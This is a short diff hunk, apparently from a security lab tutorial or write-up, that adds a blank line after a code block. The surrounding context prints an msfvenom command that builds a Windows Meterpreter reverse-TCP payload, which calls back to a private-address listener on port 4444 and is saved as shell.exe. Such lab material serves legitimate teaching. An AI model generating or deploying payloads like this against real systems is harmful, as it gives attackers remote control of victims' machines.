@@ -95,3 +95,4 @@ In later parts, we generate a reverse shell using `msfvenom`:
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -f exe > shell.exe
+
